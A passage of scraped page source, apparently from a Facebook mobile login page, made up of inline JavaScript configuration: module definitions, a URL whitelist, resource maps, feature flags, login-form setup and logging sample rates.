        "presence": {"s": "None"},
        "sfau": {"s": "None"},
        "wd": {"t": 604800, "s": "None"},
        "x-referer": {"s": "None"},
        "x-src": {"t": 1, "s": "None"}
    }, 2104], ["CookieCoreLoggingConfig", [], {
        "maximumIgnorableStallMs": 16.67,
        "sampleRate": 9.7e-5,
        "sampleRateClassic": 1.0e-10,
        "sampleRateFastStale": 1.0e-8
    }, 3401], ["MBanzaiConfig", [], {
        "EXPIRY": 86400000,
        "MAX_SIZE": 10000,
        "MAX_WAIT": 30000,
        "RESTORE_WAIT": 30000,
        "gks": {
            "boosted_component": true,
            "platform_oauth_client_events": true,
            "visibility_tracking": true,
            "xtrackable_clientview_batch": true,
            "boosted_pagelikes": true,
            "gqls_web_logging": true
        },
        "blacklist": ["time_spent"]
    }, 32], ["MJSEnvironment", [], {
        "IS_APPLE_WEBKIT_IOS": false,
        "IS_TABLET": false,
        "IS_ANDROID": true,
        "IS_CHROME": true,
        "IS_FIREFOX": false,
        "IS_WINDOWS_PHONE": false,
        "IS_SAMSUNG_DEVICE": false,
        "OS_VERSION": 8,
        "PIXEL_RATIO": 3.5,
        "BROWSER_NAME": "Chrome Mobile"
    }, 46], ["UserAgentData", [], {
        "browserArchitecture": "32",
        "browserFullVersion": "76.0.3809.132",
        "browserMinorVersion": 0,
        "browserName": "Chrome",
        "browserVersion": 76,
        "deviceName": "Unknown",
        "engineName": "WebKit",
        "engineVersion": "537.36",
        "platformArchitecture": "32",
        "platformName": "Android",
        "platformVersion": "8",
        "platformFullVersion": "8.0.0"
    }, 527], ["ZeroRewriteRules", [], {
        "rewrite_rules": {}, "whitelist": {
            "\/hr\/r": 1,
            "\/hr\/p": 1,
            "\/zero\/unsupported_browser\/": 1,
            "\/zero\/policy\/optin": 1,
            "\/zero\/optin\/write\/": 1,
            "\/zero\/optin\/legal\/": 1,
            "\/zero\/optin\/free\/": 1,
            "\/about\/privacy\/": 1,
            "\/about\/privacy\/update\/": 1,
            "\/about\/privacy\/update": 1,
            "\/zero\/toggle\/welcome\/": 1,
            "\/zero\/toggle\/nux\/": 1,
            "\/fup\/interstitial\/": 1,
            "\/work\/landing": 1,
            "\/work\/login\/": 1,
            "\/work\/email\/": 1,
            "\/ai.php": 1,
            "\/js_dialog_resources\/dialog_descriptions_android.json": 0,
            "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
            "\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0,
            "\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0,
            "\/qp\/interstitial\/": 1,
            "\/qp\/action\/redirect\/": 1,
            "\/qp\/action\/close\/": 1,
            "\/zero\/support\/ineligible\/": 1,
            "\/zero_balance_redirect\/": 1,
            "\/zero_balance_redirect": 1,
            "\/l.php": 1,
            "\/lsr.php": 1,
            "\/ajax\/dtsg\/": 1,
            "\/checkpoint\/block\/": 1,
            "\/exitdsite": 1,
            "\/zero\/balance\/pixel\/": 1,
            "\/zero\/balance\/": 1,
            "\/zero\/balance\/carrier_landing\/": 1,
            "\/zero\/flex\/logging\/": 1,
            "\/tr": 1,
            "\/tr\/": 1,
            "\/sem_campaigns\/sem_pixel_test\/": 1,
            "\/bookmarks\/flyout\/body\/": 1,
            "\/zero\/subno\/": 1,
            "\/confirmemail.php": 1,
            "\/policies\/": 1,
            "\/mobile\/internetdotorg\/classifier\/": 1,
            "\/zero\/dogfooding": 1,
            "\/xti.php": 1,
            "\/zero\/fblite\/config\/": 1,
            "\/lite\/": 1,
            "\/hr\/zsh\/wc\/": 1,
            "\/4oh4.php": 1,
            "\/autologin.php": 1,
            "\/birthday_help.php": 1,
            "\/checkpoint\/": 1,
            "\/contact-importer\/": 1,
            "\/cr.php": 1,
            "\/legal\/terms\/": 1,
            "\/login.php": 1,
            "\/login\/": 1,
            "\/mobile\/account\/": 1,
            "\/n\/": 1,
            "\/remote_test_device\/": 1,
            "\/upsell\/buy\/": 1,
            "\/upsell\/buyconfirm\/": 1,
            "\/upsell\/buyresult\/": 1,
            "\/upsell\/promos\/": 1,
            "\/upsell\/continue\/": 1,
            "\/upsell\/h\/promos\/": 1,
            "\/upsell\/loan\/learnmore\/": 1,
            "\/upsell\/purchase\/": 1,
            "\/upsell\/promos\/upgrade\/": 1,
            "\/upsell\/buy_redirect\/": 1,
            "\/upsell\/loan\/buyconfirm\/": 1,
            "\/upsell\/loan\/buy\/": 1,
            "\/upsell\/sms\/": 1,
            "\/wap\/a\/channel\/reconnect.php": 1,
            "\/wap\/a\/nux\/wizard\/nav.php": 1,
            "\/wap\/appreg.php": 1,
            "\/wap\/birthday_help.php": 1,
            "\/wap\/c.php": 1,
            "\/wap\/confirmemail.php": 1,
            "\/wap\/cr.php": 1,
            "\/wap\/login.php": 1,
            "\/wap\/r.php": 1,
            "\/zero\/datapolicy": 1,
            "\/a\/timezone.php": 1,
            "\/a\/bz": 1,
            "\/bz\/reliability": 1,
            "\/r.php": 1,
            "\/mr\/": 1,
            "\/reg\/": 1,
            "\/registration\/log\/": 1,
            "\/terms\/": 1,
            "\/f123\/": 1,
            "\/expert\/": 1,
            "\/experts\/": 1,
            "\/terms\/index.php": 1,
            "\/terms.php": 1,
            "\/srr\/": 1,
            "\/msite\/redirect\/": 1,
            "\/fbs\/pixel\/": 1,
            "\/contactpoint\/preconfirmation\/": 1,
            "\/contactpoint\/cliff\/": 1,
            "\/contactpoint\/confirm\/submit\/": 1,
            "\/contactpoint\/confirmed\/": 1,
            "\/contactpoint\/login\/": 1,
            "\/preconfirmation\/contactpoint_change\/": 1,
            "\/help\/contact\/": 1,
            "\/survey\/": 1,
            "\/upsell\/loyaltytopup\/accept\/": 1,
            "\/settings\/": 1
        }
    }, 1478], ["ZeroCategoryHeader", [], {}, 1127], ["MSession", [], {
        "useAngora": false,
        "logoutURL": "\/logout.php?h=AfczaxoSfSmxL-A6&t=1572620148",
        "push_phase": "C3"
    }, 52]]);
    new (require("ServerJS"))().handle({"require": [["MPrelude"], ["BanzaiODS"], ["VisualCompletionGating"], ["BanzaiScuba"]]});
}, "ServerJS define", {"root": true})();</script>
<script>var bigPipe = new (require("BigPipe"))({
    "forceFinish": true,
    "config": {"flush_pagelets_asap": true, "dispatch_pagelet_replayable_actions": false}
});</script>
<script>bigPipe.beforePageletArrive("first_response")</script>
<script>require("TimeSlice").guard((function () {
    bigPipe.onPageletArrive({
        bootloadable: {
            BanzaiODS: {r: ["FDfRV", "fKCiQ"], rds: {m: ["BanzaiODS", "BanzaiScuba"]}, be: 1},
            VisualCompletionGating: {r: ["oFZdM"]},
            BanzaiScuba: {r: ["FDfRV", "fKCiQ"], rds: {m: ["BanzaiODS", "BanzaiScuba"]}},
            GeneratedArtilleryUserTimingSink: {
                r: ["uYbVb", "9Zaf3", "sGe+Z", "Hx+az"],
                rds: {m: ["BanzaiODS", "BanzaiScuba"], r: ["FDfRV", "fKCiQ"]},
                be: 1
            },
            QPLInspector: {r: ["VvVFw"], be: 1},
            MPageControllerImpl: {
                r: ["fKCiQ", "QBVzy", "FDfRV", "oFZdM", "rCDRu", "WAtj5"],
                rds: {m: ["BanzaiODS", "BanzaiScuba", "MPageFetcherImpl", "VisualCompletionGating"]}
            },
            MPageFetcherImpl: {
                r: ["FDfRV", "WAtj5", "fKCiQ", "rCDRu", "oFZdM", "QBVzy"],
                rds: {m: ["BanzaiODS", "VisualCompletionGating", "BanzaiScuba"]}
            },
            Banzai: {r: ["FDfRV", "fKCiQ"], rds: {m: ["BanzaiODS", "BanzaiScuba"]}, be: 1},
            BanzaiStream: {r: ["FDfRV", "ZU1ro", "fKCiQ"], rds: {m: ["BanzaiODS", "BanzaiScuba"]}, be: 1},
            ResourceTimingBootloaderHelper: {
                r: ["dReEY", "QBVzy"],
                rds: {m: ["BanzaiODS", "BanzaiScuba"], r: ["FDfRV", "fKCiQ"]},
                be: 1
            },
            TimeSliceHelper: {r: ["oN7Oc"], be: 1},
            SnappyCompressUtil: {r: ["FDfRV"], be: 1},
            PerfXSharedFields: {r: ["aSKbc"], be: 1},
            TimeSliceInteractionsLiteTypedLogger: {
                r: ["FDfRV", "QBVzy", "FHtgt", "fKCiQ"],
                rds: {m: ["BanzaiODS", "BanzaiScuba"]},
                be: 1
            },
            WebSpeedInteractionsTypedLogger: {
                r: ["FDfRV", "QBVzy", "4LL/S", "fKCiQ"],
                rds: {m: ["BanzaiODS", "BanzaiScuba"]},
                be: 1
            }
        },
        resource_map: {
            uYbVb: {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/yncgZiC7BC6.js?_nc_x=Ij3Wp8lg5Kz"},
            "9Zaf3": {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/dQ_TzJobF0o.js?_nc_x=Ij3Wp8lg5Kz"},
            "sGe+Z": {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/JjU0WcjV29H.js?_nc_x=Ij3Wp8lg5Kz"},
            "Hx+az": {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/zO5MojAgN8I.js?_nc_x=Ij3Wp8lg5Kz"},
            VvVFw: {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/8uSRVThd7c-.js?_nc_x=Ij3Wp8lg5Kz"},
            QBVzy: {
                type: "js",
                src: "https://static.xx.fbcdn.net/rsrc.php/v3iooI4/yU/l/en_GB/SnCw2O1hpyV.js?_nc_x=Ij3Wp8lg5Kz"
            },
            wUApz: {
                type: "js",
                src: "https://static.xx.fbcdn.net/rsrc.php/v3i3kA4/y9/l/en_GB/o6BkRFKwU8P.js?_nc_x=Ij3Wp8lg5Kz"
            },
            x8HfM: {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/p8tuvcqXYV3.js?_nc_x=Ij3Wp8lg5Kz"},
            WAtj5: {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yy/r/Glpx_rv08tr.js?_nc_x=Ij3Wp8lg5Kz"},
            "3gNeM": {
                type: "js",
                src: "https://static.xx.fbcdn.net/rsrc.php/v3inQB4/yh/l/en_GB/nJcAgC8Zbun.js?_nc_x=Ij3Wp8lg5Kz"
            },
            dReEY: {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yp/r/2XZ6vXLoXjM.js?_nc_x=Ij3Wp8lg5Kz"},
            "2Csif": {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/oEypV12jOSY.js?_nc_x=Ij3Wp8lg5Kz"},
            aSKbc: {
                type: "js",
                src: "https://static.xx.fbcdn.net/rsrc.php/v3iN6O4/yp/l/en_GB/nEnpPTtt7yT.js?_nc_x=Ij3Wp8lg5Kz"
            },
            ZU1ro: {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/QKWIqWeZBgJ.js?_nc_x=Ij3Wp8lg5Kz"},
            oN7Oc: {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/cgo-ptuHQ0P.js?_nc_x=Ij3Wp8lg5Kz"},
            FHtgt: {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/3cdJiqLWPaS.js?_nc_x=Ij3Wp8lg5Kz"},
            "4LL/S": {type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/mJOToILUO1g.js?_nc_x=Ij3Wp8lg5Kz"}
        },
        gkxData: {
            "996939": {result: false, hash: "AT661kIZrjxc1VNq"},
            "996940": {result: false, hash: "AT64lS43_4NGOqAA"},
            "676940": {result: false, hash: "AT5A7dl1u9SfALj5"},
            "712819": {result: false, hash: "AT49hQAq3ZBqXis_"},
            "1132652": {result: true, hash: "AT45c4lO8NB95CR7"},
            "676781": {result: false, hash: "AT6ebV6vZfSnXOci"},
            "910664": {result: false, hash: "AT4gwKu4I_5gyA1o"},
            "1070739": {result: false, hash: "AT5KgPVNloQG_Woi"},
            "820050": {result: true, hash: "AT6c-sdl1j2pjYMR"},
            "985697": {result: false, hash: "AT5X2HUn5Bn2lcp_"},
            "676812": {result: false, hash: "AT4j6SsMN9OFYd4-"},
            "676811": {result: false, hash: "AT4q5UmIgjI5ZkOI"},
            "726410": {result: true, hash: "AT6Gc2MUK2nrKMtH"},
            "708253": {result: false, hash: "AT4Fa2MDyEMCSQak"},
            "692841": {result: false, hash: "AT471HT4re5wa53E"},
            "1029033": {result: false, hash: "AT66XQh-PL7WgLsf"},
            "1099893": {result: false, hash: "AT4Cj2QbEbIF15OH"},
            "862436": {result: false, hash: "AT4KzripjP3KnKC5"}
        },
        qexData: {"833102": {r: null}},
        allResources: ["rCDRu", "FDfRV", "fKCiQ", "QBVzy", "oFZdM", "wUApz", "x8HfM", "TrKTC", "WAtj5", "3gNeM", "dReEY", "2Csif", "aSKbc"],
        displayResources: ["rCDRu", "FDfRV", "fKCiQ", "QBVzy", "oFZdM", "TrKTC", "WAtj5", "dReEY", "2Csif", "aSKbc"],
        id: "first_response",
        phase: 0,
        jsmods: {
            instances: [["__inst_dfbc3ade_0_0", ["MLoggedOutBannerGooglePlayRedirectWithFallback", "__elem_729c1b93_0_0"], [{
                button: {__m: "__elem_729c1b93_0_0"},
                native_app_url: "https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DFptqXbJtcJgjf8uw3H6AwU-D%26referrer_params%255Blink_source%255D%3Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1",
                fallback_url: "https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DFptqXbJtcJgjf8uw3H6AwU-D%26referrer_params%255Blink_source%255D%3Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1",
                logging_data: {app_referrer: "logged_out_banner", app: "350685531728", country: "IN"}
            }], 1]],
            elements: [["__elem_de5177dd_0_0", "u_0_0", 1], ["__elem_729c1b93_0_0", "u_0_1", 1], ["__elem_921b58ef_0_0", "login_form", 1], ["__elem_e24cb174_0_0", "m_login_password", 1], ["__elem_7216e2ae_0_2", "u_0_2", 1], ["__elem_e03291d5_0_1", "u_0_3", 1], ["__elem_e03291d5_0_0", "u_0_4", 1], ["__elem_7216e2ae_0_0", "u_0_5", 1], ["__elem_7216e2ae_0_1", "u_0_6", 1], ["__elem_e980dec4_0_0", "signup-button", 1], ["__elem_8a020238_0_0", "forgot-password-link", 1], ["__elem_49f6b607_0_0", "root", 1], ["__elem_eed16c0a_0_0", "u_0_7", 1], ["__elem_a588f507_0_0", "u_0_8", 1], ["__elem_a588f507_0_1", "u_0_9", 1], ["__elem_0cdc66ad_0_0", "u_0_b", 1], ["__elem_0cdc66ad_0_1", "u_0_c", 1]],
            require: [["MLoginController", "initAccountRecoveryFunnelLogging", ["__elem_8a020238_0_0"], [{__m: "__elem_8a020238_0_0"}, "click_forget_password", "FptqXbJtcJgjf8uw3H6AwU-D"]], ["BrowserPrefillLogging", "initContactpointFieldLogging", [], [{
                contactpointFieldID: "m_login_email",
                serverPrefill: ""
            }]], ["BrowserPrefillLogging", "initPasswordFieldLogging", [], [{passwordFieldID: "m_login_password"}]], ["MLoginView", "disableOnSubmit", ["__elem_921b58ef_0_0", "__elem_7216e2ae_0_0"], [{__m: "__elem_921b58ef_0_0"}, {__m: "__elem_7216e2ae_0_0"}]], ["MLoginController", "initRegButton", ["__elem_7216e2ae_0_1"], [{
                root: {__m: "__elem_7216e2ae_0_1"},
                regURI: "/reg-no-deeplink/?cid=103",
                useRegToLogin: true
            }]], ["MLoginController", "initLoginForm", ["__elem_de5177dd_0_0"], [{
                root: {__m: "__elem_de5177dd_0_0"},
                ajaxURI: "/login/device-based/login/async/?refsrc=http%3A%2F%2Fwww.google.com%2F&lwv=100",
                rapidFeedbackUri: null,
                clearOnDelete: false,
                listenKeyDown: false,
                isTwoStepsLogin: false,
                isActionLoggingEnabled: true,
                onErrorRegURI: "/r.php",
                shouldAutoLandOnStep2: false,
                shouldPrefillJioHeaderForRegFromLogin: false,
                shouldProcessUserConsentForTokenHeader: false,
                shouldProcessUserConsentForHeader: false,
                shouldShowSmartLockSelector: false,
                shouldRunBotDetection: false,
                clearPrefillMaskOnKeydown: false,
                datrCookie: "FptqXbJtcJgjf8uw3H6AwU-D",
                pubKeyData: null
            }]], ["MPasswordPlainTextToggle", "init", ["__elem_e24cb174_0_0", "__elem_7216e2ae_0_2", "__elem_e03291d5_0_0", "__elem_e03291d5_0_1"], [{__m: "__elem_e24cb174_0_0"}, {__m: "__elem_7216e2ae_0_2"}, {__m: "__elem_e03291d5_0_0"}, {__m: "__elem_e03291d5_0_1"}]], ["ServiceWorkerLoginAndLogoutListener", "listen", [], ["login_button_block", "login", "/sw?s=push", 612424062191227]], ["MTouchable"], ["MBlockingTouchable", "init", ["__elem_e980dec4_0_0"], [{__m: "__elem_e980dec4_0_0"}]], ["__inst_dfbc3ade_0_0"], ["AccessibilityWebVirtualCursorClickLogger", "init", ["__elem_49f6b607_0_0"], [[{__m: "__elem_49f6b607_0_0"}]]], ["MScrollPositionSaver"], ["MLogoutClearCache"], ["LoadingIndicator", "init", ["__elem_eed16c0a_0_0", "__elem_a588f507_0_0", "__elem_a588f507_0_1"], [{__m: "__elem_eed16c0a_0_0"}, {__m: "__elem_a588f507_0_0"}, {__m: "__elem_a588f507_0_1"}]], ["MPageError"], ["MPageHeaderAccessibility"], ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_0"], [{__m: "__elem_0cdc66ad_0_0"}]], ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_1"], [{__m: "__elem_0cdc66ad_0_1"}]], ["MLoadingIndicator", "init", [], ["u_0_a"]], ["LogHistoryListeners"], ["ScriptPath", "set", [], ["/wap/index.php", "0f4ef985", {
                imp_id: "0QFzNhrHxtg5xu8o4",
                ef_page: null
            }]], ["MCommentViewportTracking", "singleton", [], [{
                enabled: true,
                debug_console: false,
                debug_html: false,
                idle_timeout: 5000,
                min_duration_to_log: 100,
                min_visible_size: 200
            }]], ["MLogging", "main", [], [{refid: 8}]], ["RemoteDevice", "init", [], [{
                performHardwareDetection: false,
                hashId: null
            }]], ["Artillery"], ["MLinkHack"], ["MModalDialogInit"], ["MVerifyCache", "main", [], [{viewer: 0}]], ["EventProfiler"], ["MPageNavigationTracking", "init", [], []], ["ScriptPathLogger", "startLogging", [], []], ["MTimeSpentBitArrayLogger", "init", [], ["m", false]], ["MCoreDeferred"], ["MPageControllerImpl"], ["MPageFetcherImpl"]],
            pre_display_requires: [["AddressBar", "setupLoadListener", [], [], 2], ["MobileBigPipeStratcomProxy", "init", [], [], 2], ["Stratcom", "init", [], [], 2], ["MViewport", "init", [], [], 2], ["MPageController", "init", [], [], 2], ["MResponseActionsProxy", "init", [], [], 2], ["onSyncTTI", "run", [], [], 2], ["MLiteInit", "init", [], [], 2]],
            define: [["cr:694370", ["requestIdleCallbackBlue"], {__rc: ["requestIdleCallbackBlue", "Aa1MmKOK9UnXDXJoOjnif--ARn72HyvTe4_oJwut8E6mK9azggVaZEQRgtM4A7I6WlOFv7Cf8yUStkGrYtY2Beg"]}, -1], ["cr:682175", [], {__rc: [null, "Aa25N_JsUygPkzMDDwqSs15du9jvqvC-N2Lcp5zkR7KqtOsj1G5ytqbwNDxq4N4Jkztt_w"]}, -1], ["MLoadingIndicatorSigils", [], {
                ANIMATE: "m-loading-indicator-animate",
                ROOT: "m-loading-indicator-root"
            }, 279], ["KSConfig", [], {
                killed: {__set: ["POCKET_MONSTERS_CREATE", "POCKET_MONSTERS_DELETE", "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG", "PREVENT_INFINITE_URL_REDIRECT", "POCKET_MONSTERS_UPDATE_NAME", "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION", "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING", "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING", "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER", "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API", "BUSINESS_MANAGER_SHOW_UI_HIDDEN_TASK_FOR_ASSET", "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API", "ADS_MANAGER_ATA", "RECRUITING_REQUISITION_VALIDATE_COMPANY_GROUPING_ON_LINK", "COMET_SAFARI_MEGA_LAYOUT_FIX_FOR_VIDEO_ATTACHMENTS"]},
                ko: {__set: ["acrJTh9WGdp", "1oOE64fL4wO", "2dhqRnqXGLQ", "alHyDgpJdsZ", "7r6mSP7ofr2", "1ntjZ2zgf03", "3oh5Mw86USj", "8NAceEy9JZo", "5mNEXob0nTj", "4j36SVzvP3w", "8PlKuowafe8", "53gCxKq281G", "3yzzwBY7Npj", "4NbCsulUUI3", "4NSq3ZC4ScE", "1onzIv0jH6H", "6EkCidAZKFx", "5LSlJUj3BnT", "advqeReHsha"]}
            }, 2580], ["MWebStorageMonsterWhiteList", [], {whitelist: ["^Banzai$", "^bz", "^banzai\\:last_storage_flush$", "^mutex", "^msys", "^sp_pi$", "^\\:userchooser\\:osessusers$", "^\\:userchooser\\:settings$", "^[0-9]+:powereditor:", "^Bandicoot\\:", "^brands\\:console\\:config$", "^CacheStorageVersion$", "^consoleEnabled$", "^_video_$", "^vc_", "^_showMDevConsole$", "^_ctv_", "^ga_client_id$", "^qe_switcher_nub_selection$", "^_mswam_$", "^am_recently_used_filters\\:", "^ickt$", "^imp_seq_num$"]}, 254], ["MobileAppDetect", [], {
                is_mobile_app: false,
                is_ads_manager_app: false,
                is_pages_manager: false,
                is_facebook_for_android: false,
                is_facebook_for_android_in_app_browser: false,
                is_facebook_for_ios: false,
                is_instagram: false,
                is_messenger_for_android: false,
                is_messenger_for_ios: false,
                is_wilde: false,
                is_kaios: false
            }, 1109], ["FbtLogger", [], {logger: null}, 288], ["FbtResultGK", [], {
                shouldReturnFbtResult: true,
                inlineMode: "NO_INLINE"
            }, 876], ["IntlHoldoutGK", [], {inIntlHoldout: false}, 2827], ["IntlNumberTypeConfig", [], {impl: "if (n === 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }"}, 3405], ["IntlViewerContext", [], {GENDER: 3}, 772], ["NumberFormatConfig", [], {
                decimalSeparator: ".",
                numberDelimiter: ",",
                minDigitsForThousandsSeparator: 4,
                standardDecimalPatternInfo: {primaryGroupSize: 3, secondaryGroupSize: 3},
                numberingSystemData: null
            }, 54], ["IntlPhonologicalRules", [], {
                meta: {"/_B/": "([.,!?\\s]|^)", "/_E/": "([.,!?\\s]|$)"},
                patterns: {
                    "/\u0001(.*)('|&#039;)s\u0001(?:'|&#039;)s(.*)/": "\u0001$1$2s\u0001$3",
                    "/_\u0001([^\u0001]*)\u0001/": "javascript"
                }
            }, 1496], ["FWLoader", [], {}, 278], ["ImmediateActiveSecondsConfig", [], {sampling_rate: 0}, 423], ["FalcoJSLoggerSamplingPolicies", [], {
                rates: {
                    accountquality_aqviewpanetab_augl: 1,
                    accountquality_aqviewpanetabended_augl: 1,
                    accountquality_coreappexperience_augl: 1,
                    accountquality_coreappexperienceended_augl: 1,
                    accountquality_coreinteractionbutton_augl: 1,
                    accountquality_coreinteractioncheckbox_augl: 1,
                    accountquality_coreinteractioncollapse_augl: 1,
                    accountquality_coreinteractionexpand_augl: 1,
                    accountquality_coreinteractionmouseover_augl: 1,
                    accountquality_coreinteractionmouseoverended_augl: 1,
                    accountquality_coreinteractionpanetab_augl: 1,
                    accountquality_coreuserinteraction_augl: 1,
                    accountquality_coreuserinteractionended_augl: 1,
                    adsflytrap_afsendfeedback_augl: 1,
                    adsflytrap_coreappexperience_augl: 1,
                    adsflytrap_coreappexperienceended_augl: 1,
                    adsflytrap_coreinteractionbutton_augl: 1,
                    adsflytrap_coreinteractiondropdown_augl: 1,
                    adsflytrap_coreinteractiondropdownended_augl: 1,
                    adsflytrap_coreinteractiontextinput_augl: 1,
                    adsflytrap_coreinteractiontextinputended_augl: 1,
                    adsflytrap_coreuserinteraction_augl: 1,
                    adsflytrap_coreuserinteractionended_augl: 1,
                    adsflytrap_coreviewmodal_augl: 1,
                    adsflytrap_coreviewmodalended_augl: 1,
                    adsmanager_amaccountoverview_augl: 1,
                    adsmanager_amaccountoverviewended_augl: 1,
                    adsmanager_amadbuilderimportflowstarted_augl: 1,
                    adsmanager_amadobjectcreateflow_augl: 1,
                    adsmanager_amadobjectcreateflowended_augl: 1,
                    adsmanager_amadobjectduplicateflow_augl: 1,
                    adsmanager_amadobjectduplicateflowended_augl: 1,
                    adsmanager_amadobjecteditflow_augl: 1,
                    adsmanager_amadobjecteditflowended_augl: 1,
                    adsmanager_amadobjectexportflow_augl: 1,
                    adsmanager_amadobjectexportflowended_augl: 1,
                    adsmanager_amadobjectimportflow_augl: 1,
                    adsmanager_amadobjectimportflowended_augl: 1,
                    adsmanager_amadobjectreviewandpublishflow_augl: 1,
                    adsmanager_amadobjectreviewandpublishflowended_augl: 1,
                    adsmanager_amadobjectsetbuyingtype_augl: 1,
                    adsmanager_amadobjectsetobjective_augl: 1,
                    adsmanager_amadscopyerror_augl: 1,
                    adsmanager_amapierror_augl: 1,
                    adsmanager_amconvergencecontextualmenuclick_augl: 1,
                    adsmanager_amconvergenceexternalcreationdialogclick_augl: 1,
                    adsmanager_amconvergencefocusmode_augl: 1,
                    adsmanager_amconvergencefocusmodeended_augl: 1,
                    adsmanager_amconvergencefocusmodetoggleclick_augl: 1,
                    adsmanager_amconvergenceoptinoptout_augl: 1,
                    adsmanager_amconvergencepublishflow_augl: 1,
                    adsmanager_amconvergencepublishflowended_augl: 1,
                    adsmanager_amconvergencepublishpreviewdialogselection_augl: 1,
                    adsmanager_amcrash_augl: 1,
                    adsmanager_amcreateflow_augl: 1,
                    adsmanager_amcreateflowended_augl: 1,
                    adsmanager_amcreateflowfocusframework_augl: 1,
                    adsmanager_amcreateflowfocusframeworkclicktoedit_augl: 1,
                    adsmanager_amcreateflowfocusframeworkended_augl: 1,
                    adsmanager_amcreateflowmutableoption_augl: 1,
                    adsmanager_amcreateflowpage_augl: 1,
                    adsmanager_amcreateflowpageended_augl: 1,
                    adsmanager_amcriticalexception_augl: 1,
                    adsmanager_amdraftfragmentloaderror_augl: 1,
                    adsmanager_amdraftloaderror_augl: 1,
                    adsmanager_ameditflow_augl: 1,
                    adsmanager_ameditflowended_augl: 1,
                    adsmanager_amemojiclicktoedit_augl: 1,
                    adsmanager_amemojiselectedemoji_augl: 1,
                    adsmanager_amexception_augl: 1,
                    adsmanager_amfatalerror_augl: 1,
                    adsmanager_amhomeview_augl: 1,
                    adsmanager_amhomeviewended_augl: 1,
                    adsmanager_amimporterror_augl: 1,
                    adsmanager_aminit_augl: 1,
                    adsmanager_amnamingtypeaheadselect_augl: 1,
                    adsmanager_ampublisherror_augl: 1,
                    adsmanager_amsmartbackgrounddialog_augl: 1,
                    adsmanager_amsmartbackgrounddialogclosed_augl: 1,
                    adsmanager_amsmartbackgrounderror_augl: 1,
                    adsmanager_amsmartbackgroundimagesave_augl: 1,
                    adsmanager_amtableadobject_augl: 1,
                    adsmanager_amtableadobjectended_augl: 1,
                    adsmanager_amvalidationerror_augl: 1,
                    adsmanager_coreappexperience_augl: 1,
                    adsmanager_coreappexperienceended_augl: 1,
                    adsmanager_coreuserinteraction_augl: 1,
                    adsmanager_coreuserinteractionended_augl: 1,
                    adswaittimespinners_awtspinners_augl: 1,
                    adswaittimespinners_coreappexperience_augl: 1,
                    adswaittimespinners_coreappexperienceended_augl: 1,
                    adswaittimespinners_coreuserinteraction_augl: 1,
                    adswaittimespinners_coreuserinteractionended_augl: 1,
                    auglexplorer_augleupdatefilter_augl: 1,
                    auglexplorer_coreappexperience_augl: 1,
                    auglexplorer_coreappexperienceended_augl: 1,
                    auglexplorer_coreuserinteraction_augl: 1,
                    auglexplorer_coreuserinteractionended_augl: 1,
                    billing_interface_debug: 1,
                    billing_interface_error: 1,
                    billing_interface_event: 1,
                    business_inbox_bulk_admin_assignment_action_click: 1,
                    business_inbox_bulk_admin_assignment_dialog_submit: 1,
                    business_inbox_bulk_delete_action_click: 1,
                    business_inbox_bulk_delete_dialog_submit: 1,
                    business_inbox_bulk_label_action_click: 1,
                    business_inbox_bulk_label_dialog_submit: 1,
                    business_inbox_bulk_mark_as_unread_action_click: 1,
                    business_inbox_bulk_move_to_folder_action_click: 1,
                    business_inbox_bulk_reply_action_click: 1,
                    business_inbox_bulk_reply_dialog_submit: 1,
                    business_inbox_multi_admin_assignment_update: 1,
                    business_inbox_nux_impression: 1,
                    business_inbox_thread_checkbox_click: 1,
                    business_inbox_thread_checkbox_impression: 1,
                    business_inbox_thread_checkbox_update_value: 1,
                    businessmanager_bmassetinfoextraaction_augl: 1,
                    businessmanager_bmassetpermissionaccordianmenuinteraction_augl: 1,
                    businessmanager_bmassetpermissiondelete_augl: 1,
                    businessmanager_bmassetpermissiondeletecancel_augl: 1,
                    businessmanager_bmassetpermissiondeleteconfirm_augl: 1,
                    businessmanager_bmassetpermissionedit_augl: 1,
                    businessmanager_bmassettabaddasset_augl: 1,
                    businessmanager_bmassettabaddpeople_augl: 1,
                    businessmanager_bmassettabassignpartner_augl: 1,
                    businessmanager_bmchangetabinteraction_augl: 1,
